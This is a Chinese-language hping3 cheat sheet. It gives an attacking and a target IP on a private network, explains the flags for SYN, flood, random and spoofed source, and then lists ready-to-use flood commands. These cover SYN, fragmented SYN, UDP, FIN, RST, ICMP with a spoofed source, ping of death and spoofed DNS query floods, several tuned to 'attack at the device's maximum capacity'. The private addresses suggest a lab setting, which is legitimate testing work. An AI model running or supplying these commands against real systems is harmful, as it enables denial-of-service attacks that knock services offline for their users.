攻击IP 10.185.16.237

被攻击IP 10.185.6.137

语法

-S –syn

set SYN flag 设置SYN标记，也就是发SYN数据包

-i –interval

wait (uX for X microseconds, for example -i u1000)

​ –fast alias for -i u10000 (10 packets for second) 每秒10个数据包

​ –faster alias for -i u1000 (100 packets for second) 每秒100个数据包

​ –flood sent packets as fast as possible. Don’t show replies. 以尽可能快的速度发送数据包

-p –destport

[+][+] destination port(default 0) ctrl+z inc/dec 目的IP，默认为0

-s –baseport

base source port (default random) 随机源端口

-k –keep

keep still source port 保持源端口

–tcp-timestamp

enable the TCP timestamp option to guess the HZ/uptime

-L –setack

set TCP ack 设置ACK标记

-a –spoof

spoof source address

伪造源IP

-c –count

packet count

指定发送数据包数量

实例

syn flood

尽设备最大性能攻击，150K pps左右攻击量

hping3 目标IP -S -p 目标端口 –flood –rand-source

指定每秒发送数据包数量，每秒10000请求

hping3 目标IP -S -p 目标端口 -i u10000 –rand-source

tcp Fragment（分片）

syn分片

hping3 –syn –flood 目标IP –rand-source -p 目标端口 -d 数据大小

hping3 –syn –flood 10.185.6.137 –rand-source -p 22 -d 2000

udp flood

尽设备最大性能攻击

hping3 目标IP -2 –flood –rand-source -d 数据大小 -p 80

icmp flood

源目的相同

hping3 目标IP -a 目标IP –icmp –flood

死亡ping

hping3 目标IP –icmp -d 数据包大小

以太网MTU为 1500 字节

fin flood

hping3 –fin –flood 目标IP –rand-source -p 目标端口

tcp rst flood

hping3 –rst –flood 目标IP –rand-source -p 22

DNS query flood

hping3 –udp –flood 目标IP -a 伪造源IP -p 53 -k
